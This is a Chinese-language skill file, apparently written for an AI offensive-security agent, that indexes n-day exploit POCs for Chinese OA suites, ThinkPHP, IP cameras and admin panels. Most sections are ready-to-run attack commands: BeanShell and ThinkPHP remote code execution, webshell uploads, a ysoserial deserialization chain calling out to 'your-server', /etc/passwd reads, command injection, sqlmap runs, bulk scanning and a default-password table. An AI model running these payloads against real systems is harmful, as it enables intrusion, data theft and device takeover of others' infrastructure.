---
name: src-framework-poc
description: 框架/中间件/OA系统nday漏洞POC索引与利用技能。覆盖泛微OA、用友NC、通达OA、万户OA、致远OA、ThinkPHP、海康大华摄像头、1Panel、宝塔、钉钉、百卓、亿邮等主流产品的已知漏洞POC速查。基于FrameVul索引和多个POC仓库。触发词：OA漏洞、框架漏洞、nday利用、泛微、用友、通达、POC速查、漏洞验证、已知漏洞。
metadata:
  short-description: 框架/OA/中间件nday漏洞POC索引
  tools: nuclei,afrog,vulmap,MYExploit,CameraHack,weaver_exp,thinkphp-RCE
  categories: exploit,poc,nday,oa,framework,cve
version: "1.0"
author: CyberStrikeAI
---

# 框架 / OA / 中间件 nday 漏洞 POC 索引

基于 FrameVul 的 61KB 完整索引，覆盖国内主流 OA、框架、中间件、摄像头的已知漏洞 POC 速查。

## 索引来源

```
$SKILL_DIR/../../tmp/workspace/conversations/453646fc-df12-4e36-8985-88c2c55c2c6c/src_tools/FrameVul/README.md
```

## 第一步：指纹识别

```bash
# httpx 指纹探测
cat alive.txt | httpx -title -status-code -tech-detect -o fingerprints.txt

# 使用 ehole 指纹识别
ehole finger -l alive.txt -o ehole_results.json

# 手动关键词过滤
cat alive.txt | httpx -title -silent | grep -iE '泛微|用友|通达|万户|致远|金蝶|蓝凌|飞企|蓝凌|致信|红帆|华天动力'
```

## 第二步：OA 系统漏洞速查

### 泛微 OA (Weaver e-cology/e-office/e-mobile)

```bash
# 指纹特征: /wui/index.html, /e-cology/, /eoffice/, /emobile/
# POC武器库: https://github.com/z1un/weaver_exp

# Beanshell RCE
curl -X POST 'TARGET/weaver/bsh.servlet.BshServlet' -d 'bsh.script=exec("whoami")'

# WorkflowServiceXml RCE
curl -X POST 'TARGET/services/WorkflowServiceXml' -H 'Content-Type: text/xml' -d @poc_workflow.xml

# 任意文件上传
curl -F "file=@shell.jsp" 'TARGET/weaver/weaver.common.Ctrl/.css?cmd=upload'

# SQL注入
sqlmap -u 'TARGET/weaver/weaver.file.FileDownloadForOutDoc?fileid=1*' --level 3 --risk 2

# e-mobile漏洞
# 见 FrameVul README for e-mobile specific POCs
```

### 用友 NC / U8

```bash
# 指纹特征: /uapws/, /yyoa/, /u8/
# POC来源: https://github.com/r0eXpeR/supplier

# NC BeanShell RCE
curl -X POST 'TARGET/servlet/~ic/bsh.servlet.BshServlet' -d 'bsh.script=exec("whoami")'

# NC 反序列化
java -jar ysoserial.jar CommonsCollections5 'curl http://your-server' | curl -X POST --data-binary @- 'TARGET/servlet/~uapws/soap/servlet.FileReceiveServlet'

# U8 SQL注入
sqlmap -u 'TARGET/defaultroot/DownloadServlet?path=..%2F..%2F' --batch
```

### 通达 OA (Tongda)

```bash
# 指纹特征: /ispirit/login.php, /general/index.php
# POC: https://github.com/achuna33/MYExploit

# 任意文件上传
curl -F 'file=@shell.php' 'TARGET/ispirit/im/upload.php'

# SQL注入
sqlmap -u 'TARGET/ispirit/interface/logincheck.php?user=1*'

# 文件包含
curl 'TARGET/ispirit/interface/gateway.php?json={}&url=file:///etc/passwd'
```

### 万户 OA (Wanhu)

```bash
# 指纹特征: /defaultroot/
# POC: vulnerability-list repo

# 任意文件上传
curl -F 'file=@shell.jsp' 'TARGET/defaultroot/upload/upload.jsp'

# SQL注入
curl 'TARGET/defaultroot/DownloadServlet?fileId=1%27+AND+1=1--'
```

### 致远 OA (Seeyon)

```bash
# 指纹特征: /seeyon/, /seeyon/main.do

# 任意文件上传
curl -X POST 'TARGET/seeyon/autoinstall.do' -d 'method=ajaxAction&managerName=fileManager'

# SQL注入
curl 'TARGET/seeyon/officeservlet' -d 'managerMethod=upload&arguments=1'
```

### 蓝凌 OA (Landray)

```bash
# 指纹特征: /sys/, /ekp/

# 任意文件读取
curl 'TARGET/sys/ui/extend/varkind/custom.jsp?var={"body":{"file":"file:///etc/passwd"}}'
```

## 第三步：ThinkPHP 漏洞

```bash
# 指纹: 报错信息包含 "ThinkPHP" 或 URL 包含 /index.php?s=

# ThinkPHP 5.0.23 RCE
curl -X POST 'TARGET/index.php?s=captcha' \
  -d '_method=__construct&filter[]=system&method=get&server[REQUEST_METHOD]=whoami'

# ThinkPHP 5.0.x SQL注入
sqlmap -u 'TARGET/index.php?ids[0,updatexml(0,concat(0xa,user()),1)]=1'

# ThinkPHP 2.x RCE
curl 'TARGET/index.php?%20%28%29%20%7B%20@phpinfo%28%29%3B%20%7D%20%2F%2F'

# 完整POC: $SKILL_DIR/../../tmp/workspace/.../src_tools/thinkphp-POC/README.md
```

## 第四步：摄像头漏洞

```bash
# 海康威视 Hikvision
# 指纹: /ISAPI/, /SDK/

# 未授权访问
curl 'TARGET/ISAPI/System/deviceInfo'

# 后门账号
curl -X POST 'TARGET/ISAPI/Security/users/1' -H 'Authorization: Digest ...'

# 大华 Dahua
# 指纹: /RPC2/, /cgi-bin/

# 未授权访问
curl 'TARGET/cgi-bin/snapshot.cgi?channel=1'

# 批量工具:
# https://github.com/WhaleFell/CameraHack
# https://github.com/jorhelp/Ingram (网络摄像头漏洞扫描)
```

## 第五步：其他常见产品

### 1Panel 面板

```bash
# 指纹: /api/v1/
# 后台文件读取
curl 'TARGET/api/v1/files/loadfile' -d '{"path":"/etc/passwd"}'
```

### 宝塔面板 (BT Panel)

```bash
# 指纹: 8888端口, /login
# Windows 提权: https://github.com/Hzllaga/BT_Panel_Privilege_Escalation
# Linux <6.0 存储XSS
```

### 钉钉 (DingTalk)

```bash
# RCE: https://github.com/crazy0x70/dingtalk-RCE
```

### 亿邮邮件系统 (Eyou)

```bash
# 指纹: /webmail/
# CNVD-2021-26422 RCE
curl 'TARGET/webmail/?q=;id'
```

### 百卓网络 Smart

```bash
# 文件上传: https://github.com/flyyue2001/cve
curl -F 'file=@shell.asp' 'TARGET/smart_sql_updateos.aspx'
```

### 辰信景云终端安全

```bash
# SQL注入
sqlmap -u 'TARGET/login?username=1*' --batch
```

### 奥威亚视频云平台

```bash
# 任意文件上传
curl -F 'file=@shell.aspx' 'TARGET/VideoCover.aspx'
```

### 昂捷 ERP

```bash
# SQL注入 (0day)
# POC: 微信公众号文章链接
```

## 第六步：批量 POC 验证

```bash
# nuclei 扫描常见框架漏洞
nuclei -l alive.txt -t ~/nuclei-templates/cves/ -o framework_cve.txt
nuclei -l alive.txt -t ~/nuclei-templates/cnvd/ -o framework_cnvd.txt

# afrog 批量验证
afrog -T alive.txt -o afrog_framework.html

# vulmap 在线POC
python3 vulmap.py -f alive.txt -a all

# MYExploit OA专项
python3 MYExploit.py -f oa_targets.txt -o oa_results.txt

# fscan-POC 内网验证
# https://github.com/chaosec2021/fscan-POC
```

## 第七步：手动验证流程

```
发现指纹 → 查 FrameVul 索引 → 找 POC 仓库 → 手动复现 → 截图取证据

关键 POC 仓库索引:
├── r0eXpeR/supplier          # 主流供应商漏洞汇总 ⭐最多
├── Awrrays/FrameVul          # 框架nday索引(本文档来源)
├── achuna33/MYExploit        # OA一键扫描
├── z1un/weaver_exp           # 泛微专用
├── WhaleFell/CameraHack      # 摄像头批量
├── 1120362990/vulnerability-list # 中间件高危速查
├── peiqi.wgpsec.org          # PeiQi 文库(在线POC)
└── wiki.peiqi.tech           # PeiQi Wiki
```

## 常见组件默认口令

| 组件 | 默认账号 | 默认密码 |
|------|---------|---------|
| Tomcat | tomcat/admin | tomcat/admin |
| Jenkins | admin | admin/password |
| WebLogic | weblogic | weblogic/Oracle@123 |
| JBoss | admin | admin |
| RabbitMQ | guest | guest |
| ActiveMQ | admin | admin |
| Redis | (无) | (无，但可配置) |
| MySQL | root | root/(空) |
| PostgreSQL | postgres | postgres |
| MongoDB | (无) | (无) |
| Elasticsearch | elastic | changeme |
| Grafana | admin | admin |
| Harbor | admin | Harbor12345 |
| Nacos | nacos | nacos |
| XXL-JOB | admin | 123456 |
| Druid | druid | druid |
| Supervisord | user | 123 |
| Zabbix | Admin | zabbix |
